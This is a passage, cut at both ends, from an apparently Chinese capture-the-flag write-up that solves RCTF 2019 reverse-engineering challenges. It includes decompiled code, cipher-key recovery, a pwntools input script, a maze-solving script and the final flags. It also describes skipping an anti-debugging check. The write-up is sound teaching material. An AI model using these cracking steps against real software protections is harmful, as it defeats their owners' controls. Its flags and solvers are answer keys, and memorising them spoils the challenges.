<span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(chr2 + <span class="number">0x61</span> - <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> cipher[] = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> cipher1[] = <span class="string">&quot;Bingo!\x02\x02&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> key[] = &#123; <span class="number">0xE0C7E0C7</span>, <span class="number">0xC6F1D3D7</span>, <span class="number">0xC6D3C6D3</span>, <span class="number">0xC4D0D2CE</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cipher1[i] ^= <span class="number">0x17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(cipher, cipher1, <span class="number">8</span>);</span><br><span class="line">    btea(cipher, <span class="number">2</span>, key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;rctf&#123;&quot;</span>;</span><br><span class="line">    decode((<span class="keyword">char</span> *)cipher);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag:</p><p>rctf{05e8a376e4e0446e}</p><h2 id="babyre2"><a href="#babyre2" class="headerlink" title="babyre2"></a>babyre2</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/RCTF/babyre2.zip">babyre2</a></p><p>程序逻辑:</p><p>输入8-16位长account, 8-16位长password, 不超过0x400长度的data, data范围:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(buf[i] &lt;= <span class="string">&#x27;/&#x27;</span> || buf[i] &gt; <span class="string">&#x27;9&#x27;</span>) &amp;&amp; (buf[i] &lt;= <span class="string">&#x27;`&#x27;</span> || buf[i] &gt; <span class="string">&#x27;f&#x27;</span>) &amp;&amp; (buf[i] &lt;= <span class="string">&#x27;@&#x27;</span> || buf[i] &gt; <span class="string">&#x27;F&#x27;</span>) )</span><br></pre></td></tr></table></figure><p>后以account作为key, 加密一组常量。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v12 = XXtea_1((__int64)&amp;account, (__int64)&amp;v6);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xF8u, 0xD4u, 0xD5u, 0xDCu, 0xC9u, 0xDAu, 0xCFu, 0xCEu, 0xD7u, 0xDAu, 0xCFu, 0xD2u, 0xD4u, 0xD5u, 0xC8u, 0x9Au, 0xB1u</span><br></pre></td></tr></table></figure><p>password的每一位减去十位和个位, 减去的结果作为下标从data取数据, 得到data2.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v10; ++i )</span><br><span class="line">           &#123;</span><br><span class="line">             v11 = a1[i] - (a1[i] % <span class="number">10</span> + a1[i] / <span class="number">10</span>);</span><br><span class="line">             <span class="keyword">if</span> ( v11 &gt;= v6 )</span><br><span class="line">             &#123;</span><br><span class="line">               v8 = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             ptr[i] = *(_BYTE *)(v11 + a2);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>用data2异或0xCC作为key密之前的密文。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; a2; ++j )</span><br><span class="line">    *((_BYTE *)&amp;dest + j) ^= <span class="number">0xCC</span>u;</span><br><span class="line">  ptr = XXTEA_2(v6, v7, (__int64)&amp;dest, <span class="number">16</span>, &amp;dword_204058);</span><br></pre></td></tr></table></figure><p>于是直接构造account:’1’*16, data’fd’*256, password任意16位即可</p><p>脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./babyre2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the account:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the password:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the data:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;fd&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(0x31 ^ 0xCC))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>p.s.这题还有时间限制, 调试的时候就很喜欢Time Out!0.0….</p><h2 id="DontEatMe"><a href="#DontEatMe" class="headerlink" title="DontEatMe"></a>DontEatMe</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/RCTF/DontEatMe.zip">DontEatMe</a></p><p>运行程序:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LiHua is trapped on an isolated island. One day, he caught a fish.</span><br><span class="line">Suddenly, the fish said: &quot;Dont eat me! I am Fish God, if you release me, as return , you have one wish.&quot;</span><br><span class="line">Li said : I want to know how to escape from this island.</span><br><span class="line">Fish said:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据输出找到主函数, 一开始有ZwSetInformationThread反调试:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v70 = GetModuleHandleA(<span class="string">&quot;Ntdll&quot;</span>);</span><br><span class="line">v71 = GetProcAddress(v70, <span class="string">&quot;ZwSetInformationThread&quot;</span>);</span><br><span class="line">v72 = GetCurrentThread();</span><br></pre></td></tr></table></figure><p>直接跳过就可以了, 伪随机数生成以一串key, 接下来应该是那个函数应该是Blowfish</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> srand(<span class="number">0xDEADBEEF</span>);</span><br><span class="line"> .....</span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">    key[v6++] = rand();</span><br><span class="line"> <span class="keyword">while</span> ( v6 &lt; <span class="number">8</span> );</span><br><span class="line"> key[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"> v56 = *(_QWORD *)<span class="string">&quot;fishFISH&quot;</span>;</span><br><span class="line"> *(_WORD *)&amp;key[<span class="number">1</span>] = *(_WORD *)<span class="string">&quot;fishFISH&quot;</span> ^ *(_WORD *)((<span class="keyword">char</span> *)&amp;v56 + <span class="number">1</span>);</span><br><span class="line"> *(_WORD *)&amp;key[<span class="number">3</span>] = *(_WORD *)((<span class="keyword">char</span> *)&amp;v56 + <span class="number">1</span>) ^ *(_WORD *)((<span class="keyword">char</span> *)&amp;v56 + <span class="number">3</span>);</span><br><span class="line"> *(_WORD *)&amp;key[<span class="number">5</span>] = WORD1(v56) ^ *(_WORD *)((<span class="keyword">char</span> *)&amp;v56 + <span class="number">5</span>);</span><br><span class="line">key[<span class="number">7</span>] = BYTE3(v56) ^ aFishfish[<span class="number">7</span>];</span><br><span class="line">Blowfish((<span class="keyword">int</span>)&amp;v49);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>特征为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rdata:000B3118 dword_B3118     dd 243F6A88h            ; DATA XREF: Blowfish+12↑o</span><br><span class="line">.rdata:000B311C                 dd 85A308D3h</span><br><span class="line">.rdata:000B3120                 dd 13198A2Eh</span><br><span class="line">.rdata:000B3124                 dd 3707344h</span><br><span class="line">.rdata:000B3128                 dd 0A4093822h</span><br><span class="line">.rdata:000B312C                 dd 299F31D0h</span><br><span class="line">.rdata:000B3130                 dd 82EFA98h</span><br><span class="line">.rdata:000B3134                 dd 0EC4E6C89h</span><br><span class="line">.rdata:000B3138                 dd 452821E6h</span><br><span class="line">.rdata:000B313C                 dd 38D01377h</span><br><span class="line">.rdata:000B3140                 dd 0BE5466CFh</span><br><span class="line">.rdata:000B3144                 dd 34E90C6Ch</span><br><span class="line">.rdata:000B3148                 dd 0C0AC29B7h</span><br><span class="line">.rdata:000B314C                 dd 0C97C50DDh</span><br><span class="line">.rdata:000B3150                 dd 3F84D5B5h</span><br><span class="line">.rdata:000B3154                 dd 0B5470917h</span><br><span class="line">.rdata:000B3158                 dd 9216D5D9h</span><br><span class="line">.rdata:000B315C                 dd 8979FB1Bh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来这里, 无论输什么, 运算后v8 = 8。所以else里面那一大串都可以不用看hhh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 / <span class="number">16</span> &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = envpa;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v12 = (<span class="keyword">unsigned</span> __int8 *)(v9 + <span class="number">2</span>);</span><br><span class="line">    .....</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来大一串, 就为了生成一个迷宫</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a68 = *(_QWORD *)<span class="string">&quot;DontEatM&quot;</span>;</span><br><span class="line"> v93 = _byteswap_ushort(aDonteatm[<span class="number">0</span>]);</span><br><span class="line"> v94 = _byteswap_ushort(WORD1(a68));</span><br><span class="line"> v95 = _byteswap_ushort(aDonteatm[<span class="number">2</span>]);</span><br><span class="line"> v96 = _byteswap_ushort(aDonteatm[<span class="number">3</span>]);</span><br><span class="line"> v97 = &amp;byte_3F501A;</span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line"> &#123;</span><br><span class="line">   *((_WORD *)v97 - <span class="number">1</span>) ^= v93;</span><br><span class="line">   *(_WORD *)v97 ^= v94;</span><br><span class="line">   *((_WORD *)v97 + <span class="number">1</span>) ^= v95;</span><br><span class="line">   *((_WORD *)v97 + <span class="number">2</span>) ^= v96;</span><br><span class="line">   v97 += <span class="number">8</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v97 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)&amp;unk_3F503A );</span><br><span class="line"> v98 = maze;</span><br><span class="line"> v99 = (<span class="keyword">unsigned</span> __int16 *)&amp;unk_3F5018;</span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line"> &#123;</span><br><span class="line">   v100 = *v99;</span><br><span class="line">   v101 = <span class="number">15</span>;</span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">   &#123;</span><br><span class="line">     v102 = (v100 &amp; (<span class="number">1</span> &lt;&lt; v101)) &gt;&gt; v101;</span><br><span class="line">     --v101;</span><br><span class="line">     *v98 = v102;</span><br><span class="line">     ++v98;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span> ( v101 &gt; <span class="number">-1</span> );</span><br><span class="line">   ++v99;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v99 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)&amp;unk_3F5038 );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大概长这样:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1111111111111111</span><br><span class="line">1000000000111111</span><br><span class="line">1011111110111111</span><br><span class="line">1011111110111111</span><br><span class="line">1011110000000111</span><br><span class="line">1011110111110111</span><br><span class="line">1011110111110111</span><br><span class="line">1011110000110111</span><br><span class="line">1011111110110111</span><br><span class="line">1011111110110111</span><br><span class="line">1000000000110111</span><br><span class="line">1111101111110111</span><br><span class="line">1111100000000111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line">1111111111111111</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据<code>maze</code>和解密后的输入进行check</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v103 = *v92;</span><br><span class="line"> v104 = <span class="number">10</span>;</span><br><span class="line"> v105 = <span class="number">0</span>;</span><br><span class="line"> v106 = <span class="number">5</span>;</span><br><span class="line"> <span class="keyword">if</span> ( *v92 )</span><br><span class="line"> &#123;</span><br><span class="line">   v107 = <span class="number">160</span>;</span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">switch</span> ( v103 )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">         --v106;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">         ++v106;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">         ++v104;</span><br><span class="line">         v107 += <span class="number">16</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">         --v104;</span><br><span class="line">         v107 -= <span class="number">16</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> ( maze[v107 + v106] == <span class="number">1</span> )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     v103 = v92[v105++ + <span class="number">1</span>];</span><br><span class="line">     <span class="keyword">if</span> ( !v103 )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">if</span> ( v104 == <span class="number">4</span> &amp;&amp; v106 == <span class="number">9</span> &amp;&amp; v105 &lt; <span class="number">17</span> )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Congratulations! Here is your flag: RCTF&#123;%s&#125;&quot;</span>, &amp;input);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接DFS算出明文:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">maze = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">op = <span class="string">&quot;adsw&quot;</span></span><br><span class="line">num = <span class="number">10</span></span><br><span class="line">num1 = <span class="number">0</span></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line">y = <span class="number">160</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getop</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    <span class="keyword">global</span> y</span><br><span class="line">    <span class="keyword">if</span> n == <span class="built_in">ord</span>(op[<span class="number">0</span>]):</span><br><span class="line">        x -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="built_in">ord</span>(op[<span class="number">1</span>]):</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="built_in">ord</span>(op[<span class="number">2</span>]):</span><br><span class="line">        num  += <span class="number">1</span></span><br><span class="line">        y += <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="built_in">ord</span>(op[<span class="number">3</span>]):</span><br><span class="line">        num -= <span class="number">1</span></span><br><span class="line">        y -= <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    <span class="keyword">global</span> y</span><br><span class="line">    <span class="keyword">if</span> n == <span class="built_in">ord</span>(op[<span class="number">0</span>]):</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="built_in">ord</span>(op[<span class="number">1</span>]):</span><br><span class="line">        x -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="built_in">ord</span>(op[<span class="number">2</span>]):</span><br><span class="line">        num  -= <span class="number">1</span></span><br><span class="line">        y -= <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="built_in">ord</span>(op[<span class="number">3</span>]):</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        y += <span class="number">16</span></span><br><span class="line"></span><br><span class="line">ans = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">global</span> num1</span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    <span class="keyword">global</span> y</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">4</span> <span class="keyword">and</span> x == <span class="number">9</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, ans)))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, op)):</span><br><span class="line">        getop(i)</span><br><span class="line">        ans[n] = i</span><br><span class="line">        <span class="keyword">if</span> maze[x+y] != <span class="number">1</span>:</span><br><span class="line">            dfs(n+<span class="number">1</span>)</span><br><span class="line">        recover(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到:<code>ddddwwwaaawwwddd</code></p><p>最终解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;\x00\x0F\x1A\x01\x35\x3A\x3B\x20&quot;</span></span><br><span class="line">Cipher = <span class="string">b&quot;ddddwwwaaawwwddd&quot;</span></span><br><span class="line"></span><br><span class="line">obj = Blowfish.new(key)</span><br><span class="line">plain = obj.encrypt(Cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, <span class="built_in">list</span>(plain))):</span><br><span class="line">    <span class="built_in">print</span>(i[<span class="number">2</span>:<span class="number">4</span>], end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得flag:<br>RCTF{db824ef8605c5235b4bbacfa2ff8e087}</p><h2 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/RCTF/crack.zip">crack</a></p><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>根据字符串, 找到主要函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> v4 = v3;</span><br><span class="line">  sub_106E558(v3, <span class="number">1</span>);</span><br><span class="line">  v5 = v4[<span class="number">52</span>];</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v5 - <span class="number">4</span>) &gt; <span class="number">1</span> )</span><br><span class="line">    sub_10613E0(*(_DWORD *)(v5 - <span class="number">12</span>));</span><br><span class="line">  v6 = <span class="number">3</span> * v4[<span class="number">58</span>];</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)v4[<span class="number">56</span>];</span><br><span class="line">  v4[<span class="number">53</span>] = v4[<span class="number">52</span>];</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, v6);</span><br><span class="line">  v8 = *(_DWORD *)(v4[<span class="number">52</span>] - <span class="number">12</span>);                <span class="comment">// len(input)</span></span><br><span class="line">  v9 = (_DWORD *)v4[<span class="number">54</span>];</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0x100758E540F</span>i64;</span><br><span class="line">  v29 = v8;</span><br><span class="line">  v28 = v9;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Try Again!&quot;</span>, <span class="string">&quot;tip&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13 = v4[<span class="number">58</span>];                               <span class="comment">// 0x200</span></span><br><span class="line">                                                <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> ( v12 &gt;= v13 )                           <span class="comment">// 0x200 * 0x200</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v12 &lt; <span class="number">0</span> || (input = (<span class="keyword">char</span> *)v4[<span class="number">52</span>], v12 &gt; *((_DWORD *)input - <span class="number">3</span>)) )<span class="comment">// len(input) = *(input-3)</span></span><br><span class="line">      sub_1061560(<span class="number">0x80070057</span>);</span><br><span class="line">    v15 = *(<span class="keyword">unsigned</span> __int16 *)&amp;input[<span class="number">2</span> * v12];</span><br><span class="line">    <span class="keyword">if</span> ( v15 != <span class="string">&#x27;0&#x27;</span> &amp;&amp; v15 != <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">      <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Input no accept!&quot;</span>, <span class="string">&quot;tip&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">      v27 = ++v10;</span><br><span class="line">    v16 = v28[v10 + v12 * v13];</span><br><span class="line">    v17 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v30 &lt; v16;</span><br><span class="line">    LODWORD(v30) = v30 - v16;</span><br><span class="line">    v10 = v27;</span><br><span class="line">    v9 = v28;</span><br><span class="line">    HIDWORD(v30) -= v17;</span><br><span class="line">    <span class="keyword">if</span> ( v12 &gt; v27 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11[v4[<span class="number">56</span>]] = v28[v12 + v27 * v13];</span><br><span class="line">      v11[v4[<span class="number">56</span>] + <span class="number">1</span>] = BYTE1(v28[v12 + v27 * v4[<span class="number">58</span>]]);</span><br><span class="line">      v11[v4[<span class="number">56</span>] + <span class="number">2</span>] = BYTE2(v28[v12 + v27 * v4[<span class="number">58</span>]]);</span><br><span class="line">      v10 = v27;</span><br><span class="line">      v11 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v12;</span><br><span 